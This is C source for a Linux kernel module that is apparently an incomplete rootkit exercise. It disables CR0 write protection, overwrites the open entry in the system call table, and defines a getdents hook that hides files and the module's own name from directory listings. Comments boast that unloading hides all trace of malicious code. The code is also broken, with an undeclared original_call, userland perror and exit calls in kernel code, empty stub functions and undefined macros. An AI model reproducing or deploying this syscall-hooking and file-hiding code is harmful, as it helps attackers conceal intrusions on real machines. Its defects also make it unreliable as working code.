#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>

#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

#define handle_error(msg)                                                      \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};

void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage long (*original_getdents)(unsigned int fd,
                                     struct linux_dirent *dirent,
                                     unsigned int count);
asmlinkage int (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_close)(int fd);

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  printk(KERN_INFO "Very, very Sneaky!\n");
  return original_call(pathname, flags);
}

asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                    struct linux_dirent *dirent,
                                    unsigned int count) {
  long read_len = original_getdents(fd, dirent, count);
  if (read_len < 0) {
    handle_error("getdents");
    return read_len;
  }
  struct linux_dirent *evil;
  int position;
  char *dbuf = (char *)dirent;
  for (position = 0; position < read_len;) {
    evil = (struct linux_dirent *)(dbuf + position);
    if (strncmp(evil->d_name, SNEAKY_PREFIX, SNEAKY_PREFIX_SIZE) == 0 ||
        strstr(evil->d_name, SNEAKY_MODULE) != NULL) {
      memcpy(dbuf + position, dbuf + position + evil->d_reclen,
             read_len - (position +
                         evil->d_reclen)); // delete this sub dire/file by
                                           // moving things behind it forward
    } else {
      position += evil->d_reclen; // if not sneaky part,comes to next entry
    }
  }
  return read_len;
}

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {}
asmlinkage int sneaky_sys_close(int fd) {}
// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
